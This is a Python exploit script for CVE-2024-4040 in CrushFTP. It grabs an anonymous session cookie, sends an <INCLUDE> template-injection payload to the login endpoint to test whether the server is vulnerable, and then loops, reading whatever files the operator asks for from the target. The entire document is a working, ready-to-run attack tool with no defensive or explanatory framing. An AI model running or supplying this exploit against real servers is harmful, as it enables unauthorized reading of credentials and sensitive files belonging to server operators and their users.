import requests
import argparse
import sys

import urllib3

urllib3.disable_warnings((urllib3.exceptions.InsecureRequestWarning))

def ascii():
    art = print("""   _  _         _     _   _          ___ _       
 | || |__ _ __| |__ | |_| |_  ___  | _ \ |__ _ _ _  ___| |_ 
 | __ / _` / _| / / |  _| ' \/ -_) |  _/ / _` | ' \/ -_)  _|
 |_||_\__,_\__|_\_\  \__|_||_\___| |_| |_\__,_|_||_\___|\__|
""")
    return art 
    
def scan(targetUrl, targetPort):
    loginUrl = targetUrl + ":" + targetPort + "/WebInterface/login.html" #Login URL
    
    #setting a crushAuth tokem for anonymous user by sending a post request to the login url
    r = requests.post(loginUrl)
    cookies = r.cookies

    data = {
        "command": "exists",
        "paths": r"<INCLUDE>users/MainUsers/groups.XML</INCLUDE>",
        "c2f": cookies['currentAuth']
    }
    
    print ("[+] Checking if the target is vulnerable..")
    r = requests.post(loginUrl, data = data, cookies = cookies)
    
    #check if the <groups string is present in the groups.xml file or not
    if "<groups" in r.text:
        print("Target is Vulnerable!")
        
        #Getting the user input to exploit or not
        getUserChoice = input("Do you want to exploit this? (Y)es or (N)o: ") 
        
        if getUserChoice.lower() in ["y", "yes"]:
            while True:
                try:
                    fileToRead = input("[+] File to be read from target(Case Sentitive): ")
                    exploit(loginUrl, fileToRead, cookies)
                except KeyboardInterrupt:
                    sys.exit("\nKeyboardInterrupt caught. Exiting...")
                    
        else:
            sys.exit("Exiting..")
        
    else:
        print("Target might not be vulnerable...")

def exploit(loginUrl, fileToRead, cookies):
    data = {
        "command": "exists",
        "paths": f"<INCLUDE>{fileToRead}</INCLUDE>",
        "c2f": cookies['currentAuth']
    }
    r = requests.post(loginUrl, data = data, cookies = cookies)  #requesting the file to be read from target
    print(r.text)
    
def main():
    parser = argparse.ArgumentParser(description="CVE-2024-4040")
    parser.add_argument("-u", '--targetUrl', required=True, help="The target URL")
    parser.add_argument("-p", '--targetPort', required=True, help="The target Port")
    args = parser.parse_args()
    try:
        ascii()
        return(scan(args.targetUrl, args.targetPort))
            
    except Exception:
        sys.exit("Some error occured..")
        
if __name__ == "__main__":
    main()
